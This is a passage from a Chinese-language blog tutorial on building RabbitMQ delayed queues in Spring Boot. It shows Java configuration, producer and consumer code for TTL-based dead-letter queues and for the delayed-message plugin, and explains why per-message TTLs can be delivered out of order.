class="hljs-meta">@Qualifier(&quot;queueB&quot;)</span> Queue queueB,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueB).to(xExchange).with(<span class="hljs-string">&quot;XB&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueDBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueD&quot;)</span> Queue queueD,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;yExchange&quot;)</span> DirectExchange yExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueD).to(yExchange).with(<span class="hljs-string">&quot;YD&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>消费者代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.consumer;<br><br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 消费者</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 21:53]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLetterQueueConsumer</span> &#123;<br><br>    <span class="hljs-comment">//接收消息</span><br>    <span class="hljs-meta">@RabbitListener(queues = &quot;QD&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receiveD</span><span class="hljs-params">(Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.info(<span class="hljs-string">&quot;当前时间：&#123;&#125;，收到死信队列的消息：&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>生产者代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 发送延迟消息</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ttl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendMsgController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//开始发消息</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMsg/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>      log.info(<span class="hljs-string">&quot;当前时间：&#123;&#125;，发送一条信息给两个TTL队列：&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),message);<br><br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XA&quot;</span>,<span class="hljs-string">&quot;消息来自TTL为10s的队列：&quot;</span> + message);<br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XB&quot;</span>,<span class="hljs-string">&quot;消息来自TTL为40s的队列：&quot;</span> + message);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112224824453.png" alt="image-20230112224824453" /></p></li></ol><h2 id="83-队列优化"><a class="markdownIt-Anchor" href="#83-队列优化"></a> 8.3 队列优化</h2><blockquote><p>问题</p></blockquote><p>第一条消息在10S后变成了死信消息，然后被消费者消费掉，第二条消息在40S之后变成了死信消息，然后被消费掉，这样一个延时队列就打造完成了。<br />不过，如果这样使用的话，岂不是每增加一个新的时间需求，就要新增一个队列，这里只有10S和40S两个时间选项，如果需要一个小时后处理，那么就需要增加TTL为一个小时的队列，如果是预定会议室然后提前通知这样的场景，岂不是要增加无数个队列才能满足需求？</p><blockquote><p>代码架构图</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113095316877.png" alt="image-20230113095316877" /></p><blockquote><p>实现</p></blockquote><ol><li><p>配置文件类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* TTL队列 配置文件类代码</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TtlQueueConfig</span> &#123;<br><br><br>    <span class="hljs-comment">//普通交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>  <span class="hljs-variable">X_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X&quot;</span>;<br>    <span class="hljs-comment">//死信交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Y_DEAD_LETTER_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y&quot;</span>;<br>    <span class="hljs-comment">//普通队列的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_A</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QA&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_B</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QB&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_C</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QC&quot;</span>;<br>    <span class="hljs-comment">//死信队列的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LATTER_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QD&quot;</span>;<br><br>    <span class="hljs-comment">//声明QC队列</span><br>    <span class="hljs-meta">@Bean(&quot;queueC&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueC</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//设置死信交换机</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//设置死信RoutingKey</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable().withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueCBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueC&quot;)</span> Queue queueC,<span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueC).to(xExchange).with(<span class="hljs-string">&quot;XC&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//声明xExchange</span><br>    <span class="hljs-meta">@Bean(&quot;xExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">xExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(X_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//声明yExchange</span><br>    <span class="hljs-meta">@Bean(&quot;yExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">yExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(Y_DEAD_LETTER_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//声明队列</span><br>    <span class="hljs-meta">@Bean(&quot;queueA&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueA</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//设置死信交换机</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//设置死信Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//设置TTL 单位是ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">10000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_A).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//声明普通队列 TTL为40s</span><br>    <span class="hljs-meta">@Bean(&quot;queueB&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueB</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//设置死信交换机</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//设置死信Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//设置TTL 单位是ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">40000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_B).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//死信队列</span><br>    <span class="hljs-meta">@Bean(&quot;queueD&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueD</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(DEAD_LATTER_QUEUE).build();<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueABindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueA&quot;)</span> Queue queueA,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueA).to(xExchange).with(<span class="hljs-string">&quot;XA&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueB&quot;)</span> Queue queueB,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueB).to(xExchange).with(<span class="hljs-string">&quot;XB&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueDBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueD&quot;)</span> Queue queueD,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;yExchange&quot;)</span> DirectExchange yExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueD).to(yExchange).with(<span class="hljs-string">&quot;YD&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 发送延迟消息</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ttl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendMsgController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br><br><br>    <span class="hljs-comment">//开始发消息</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMsg/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>      log.info(<span class="hljs-string">&quot;当前时间：&#123;&#125;，发送一条信息给两个TTL队列：&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),message);<br><br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XA&quot;</span>,<span class="hljs-string">&quot;消息来自TTL为10s的队列：&quot;</span> + message);<br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XB&quot;</span>,<span class="hljs-string">&quot;消息来自TTL为40s的队列：&quot;</span> + message);<br><br>    &#125;<br>    <span class="hljs-comment">//开始发消息</span><br>    <span class="hljs-meta">@GetMapping(&quot;sendExpirationMsg/&#123;message&#125;/&#123;ttlTime&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message,<span class="hljs-meta">@PathVariable</span> String ttlTime)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;当前时间：&#123;&#125;，发送一条时长&#123;&#125;毫秒TTL信息给队列QC：&#123;&#125;&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),ttlTime,message);<br>        rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XC&quot;</span>,message,msg-&gt;&#123;<br>            <span class="hljs-comment">//发送消息的时候 延迟时长</span><br>            msg.getMessageProperties().setExpiration(ttlTime);<br>            <span class="hljs-keyword">return</span> msg;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者代码无需改变</p></li><li><p>效果及问题：按理来说应该是你好2先收到</p><p><a href="http://localhost:8080/ttl/sendExpirationMsg/%E4%BD%A0%E5%A5%BD">http://localhost:8080/ttl/sendExpirationMsg/你好</a> 1/20000</p><p><a href="http://localhost:8080/ttl/sendExpirationMsg/%E4%BD%A0%E5%A5%BD">http://localhost:8080/ttl/sendExpirationMsg/你好</a> 2/2000</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113100800893.png" alt="image-20230113100800893" /></p><p><strong>因为RabbitMQ只会检查第一个消息是否过期，如果过期则丢到死信队列， 如果第一个消息的延时时长很长，而第二个消息的延时时长很短，第二个消息并不会优先得到执行</strong>！</p></li></ol><h2 id="84-插件实现延迟队列"><a class="markdownIt-Anchor" href="#84-插件实现延迟队列"></a> 8.4 插件实现延迟队列</h2><p><a href="http://xtwoy.github.io/2023/01/13/Docker%E5%AE%89%E8%A3%85RabbitMQ%E5%B9%B6%E5%AE%89%E8%A3%85%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6/">链接</a></p><blockquote><p>代码架构图</p></blockquote><p>在这里新增了一个队列 delayed.queue,一个自定义交换机 delayed.exchange，绑定关系如下:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113142916218.png" alt="image-20230113142916218" /></p><blockquote><p>实现</p></blockquote><ol><li><p>配置文件类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Binding;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.BindingBuilder;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.CustomExchange;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:31]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DelayedQueueConfig</span> &#123;<br><br>    <span class="hljs-comment">//队列</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DELAYED_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delayed.queue&quot;</span>;<br>    <span class="hljs-comment">//交换机</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DELAYED_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delayed.exchange&quot;</span>;<br>    <span class="hljs-comment">//routingKey</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DELAYED_ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delayed.routingkey&quot;</span>;<br><br>    <span class="hljs-comment">//声明队列</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">delayedQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(DELAYED_QUEUE_NAME);<br>    &#125;;<br><br><br><br>    <span class="hljs-comment">//声明交换机</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> CustomExchange <span class="hljs-title function_">delayedExchange</span><span class="hljs-params">()</span>&#123;<br><br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        arguments.put(<span class="hljs-string">&quot;x-delayed-type&quot;</span>,<span class="hljs-string">&quot;direct&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomExchange</span>(DELAYED_EXCHANGE_NAME,<span class="hljs-string">&quot;x-delayed-message&quot;</span>,<br>                <span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,arguments);<br>    &#125;<br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">delayedQueueBindingDelayedExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;delayedQueue&quot;)</span> Queue delayedQueue,</span><br><span class="hljs-params">                                                      <span class="hljs-meta">@Qualifier(&quot;delayedExchange&quot;)</span> CustomExchange delayedExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(delayedQueue).to(delayedExchange).with(DELAYED_ROUTING_KEY).noargs();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.consumer;<br><br><span class="hljs-keyword">import</span> io.xtwoy.DelayedQueueConfig;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 消费者代码 基于插件的延迟消</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:32]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DelayQueueConsumer</span> &#123;<br><br>    <span class="hljs-comment">//监听消息</span><br>    <span class="hljs-meta">@RabbitListener(queues = DelayedQueueConfig.DELAYED_QUEUE_NAME)</span><br>    <span 